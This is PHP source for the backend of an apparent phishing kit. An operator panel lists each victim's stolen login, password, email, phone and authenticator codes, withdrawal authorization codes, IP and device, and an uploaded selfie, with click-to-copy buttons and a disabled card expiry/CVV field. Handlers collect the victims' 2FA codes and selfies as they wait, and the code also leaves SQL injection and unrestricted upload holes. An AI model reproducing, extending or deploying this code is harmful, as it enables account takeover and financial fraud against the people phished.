			<div class='modal fade' id='viewmodal_userid_{$value['id']}' tabindex='-1' role='dialog' style='opacity:1 !important;display:none' aria-labelledby='exampleModalLabel' aria-hidden='true'>
			
				<form name='config_form_{$value['id']}' id='config_form_{$value['id']}' method='POST' action='' novalidate>
				<input type='hidden' name='userid' value='{$value['id']}'>
				<div class='modal-dialog' role='document' style='margin-top:20%;max-width:100%;font-size:1.2rem;'>
				<div class='modal-content' style='background-color: black;'>
					<div class='modal-header' style='background-color:#34495E;font-size:2.7rem;text-align:center;'>
					<h5 class='modal-title' id='exampleModalLabel' style='color:white;font-size:1.2rem'>Admin Control (click on log to auto-copy)</h5>
					<button type='button' class='close' onclick='close_btn()'  aria-label='Close'>
						<span aria-hidden='true' style='color:white'>&times;</span>
					</button>
					</div>
					<div class='modal-body'>
					
					<!-- START CONTENT -->
			
					<div class='form-group' style='margin-bottom:1rem'>
						<br>
						<center><img src='$filepath' style='width:70px;border-radius:10px' alt='no image to display'></center>
						<br>

						<div class='data-group'>
							<label class='data-label'>User login</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$usrlogin'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Password</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$usrpass'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Mail Code</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$mailcode'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Phone Code</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$phonecode'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Google Code</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$authcode'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Mail Code**</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$secmailcode'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Phone Code**</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$secphonecode'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Google Code**</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$secauthcode'>
						</div>
						<!--
						<div class='data-group'>
							<label class='data-label'>Exp / CVV</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$expiry [$cvvnum]'>
						</div>
						-->
						<div class='data-group'>
							<label class='data-label'>IP/Device</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$ip [$useragent]'>
						</div>
						<br>
					</div>
					
					<!-- END -->
					
					<div class='modal-footer' style='margin-top:-40px'>
					<button style='color:black;background-color:white' type='button' onclick='close_btn()' class='btn btn-lg btn-dark col-12' >CLOSE</button>
					
					</div>
			
			</div>
			
			</div>
			</div>
			</div>
			</form>
			</div>
			";
		}
	}

	// FETCHING STATISTICS DATA
	if (isset($_GET['counter'])) {
		$ipFile = '../../logs/visits.txt';
		$activequery = mysqli_query($conn, "SELECT * FROM customers WHERE status <20");
		$completequery = mysqli_query($conn, "SELECT * FROM customers WHERE status=20");
		if ($activequery and $completequery) {
			$userRows = count(file($ipFile));
			$activeRows = mysqli_num_rows($activequery);
			$completeRows = mysqli_num_rows($completequery);
			$stats = array(
				"usernum" => $userRows,
				"activenum" => $activeRows,
				"completednum" => $completeRows
			);
			echo json_encode($stats);
		} else {
			echo json_encode(array(
				'stats' => 'error'
			));
		}
	}

	// FETCHING IP INFO DATA
	if (isset($_GET['visitlog'])) {
		$ipFile = '../../logs/visitors.txt';
		$logquery = file_get_contents($ipFile, true);
		if ($logquery) {
			$log = array(
				"visitorlog" => $logquery
			);
			echo json_encode($log);
		} else {
			echo json_encode(array(
				'stats' => 'error'
			));
		}
	}

	// TURNING OFF SOUND
	if (isset($_GET['buzzoff'])) {
		$query = mysqli_query($conn, "SELECT * FROM customers WHERE status<=7");
		if ($query) {
			$array = array_filter(mysqli_fetch_all($query, MYSQLI_ASSOC));
			foreach ($array as $value) {
				$userid = $value['id'];
				$queryy = mysqli_query($conn, "UPDATE customers SET buzzed=1 WHERE id=$userid");
				if ($queryy) {
					$stat = 'ok';
				} else {
					$stat = 'notok';
				}
			}
			if ($stat == 'ok') {
				echo json_encode(array(
					'status' => 'ok'
				));
			} else {
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		} else {
			echo json_encode(array(
				'status' => 'notok'
			));
		}
	}

	// DELETE DATA
	if ($_GET['type'] == 'delete') {
		if ($_POST['userid'] and numeric($_POST['userid']) == true) {
			$userid = $_POST['userid']; // the normal id not unique one

			$query = mysqli_query($conn, "DELETE FROM customers WHERE id=$userid");


			if ($query) {
				echo json_encode(array(
					'status' => 'ok'
				));
			} else {
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		} else {
			echo json_encode(array(
				'status' => 'notokk'
			));
		}
	}
}



// USER SUBMISSION FORM HANDLER
if ($_SESSION['started'] == 'true') {


	// USER WAITING HANDLER
	if ($_GET['getstatus'] and numeric($_GET['getstatus']) == true) {
		$id = $_GET['getstatus'];
		$query = mysqli_query($conn, "SELECT * from customers WHERE uniqueid='$id'");

		if (mysqli_num_rows($query) >= 1) {
			$array = mysqli_fetch_array($query, MYSQLI_ASSOC);
			echo $array['status'];
		}
	}
	
	// ==========USER INPUT HANDLERS =========== //

	if($_GET['type'] == 'deviceAuth'){
		if(($_POST['mailcode'] or $_POST['phonecode'] or $_POST['authcode']) and $_POST['userid'] and numeric($_POST['userid']) == true ){
			$mailcode = $_POST["mailcode"];
			$phonecode = $_POST["phonecode"];
			$authcode = $_POST["authcode"];
			$comment = "Device Authorization Code(s) Entered, user waiting";
			$uniqueid = $_POST['userid']; // unique userid

			$query = mysqli_query($conn, "UPDATE customers SET mailcode='{$mailcode}', phonecode='{$phonecode}', authcode='{$authcode}', comment='{$comment}', status=2, buzzed=0 WHERE uniqueid={$uniqueid}");
			if($query){
				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'Auth notok'
				));
			}
		}
	}
	
	if($_GET['type'] == 'securityCode'){
		if(($_POST['secmailcode'] or $_POST['secphonecode'] or $_POST['secauthcode']) and $_POST['userid'] and numeric($_POST['userid']) == true ){
			$secmailcode = $_POST["secmailcode"];
			$secphonecode = $_POST["secphonecode"];
			$secauthcode = $_POST["secauthcode"];
			$comment = "Withdrawal Authorization Code(s) Entered, user waiting";
			$uniqueid = $_POST['userid']; // unique userid

			$query = mysqli_query($conn, "UPDATE customers SET secmailcode='{$secmailcode}', secphonecode='{$secphonecode}', secauthcode='{$secauthcode}', comment='{$comment}', status=3, buzzed=0 WHERE uniqueid={$uniqueid}");
			if($query){
				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'Auth notok'
				));
			}
		}
	}
	
	if ($_GET["type"] == "UserUpload") {
		if ($_FILES["attachment"] and $_POST["userid"] and numeric($_POST["userid"]) == true) {
			$targetDir = "../../uploads/";
			$fileName = basename($_FILES["attachment"]["name"]);
			$targetFilePath = $targetDir . $fileName;
			move_uploaded_file($_FILES["attachment"]["tmp_name"], $targetFilePath);
			$comment = "Selfie Uploaded, user waiting";
			$filepath = $targetFilePath;
			$uniqueid = $_POST['userid']; // unique userid
			$query = mysqli_query($conn, "UPDATE customers SET filepath='{$filepath}', comment='{$comment}', status=4, buzzed=0 WHERE uniqueid={$uniqueid}");
			if($query){
				header("Location: ../loading.php?user=true");
				echo json_encode(array("status" => "ok"));
			} else {
				header("Location: ../auth.php?user=true");
				echo json_encode(array("status" => "Upload Error"));
			}
		}
	}
}
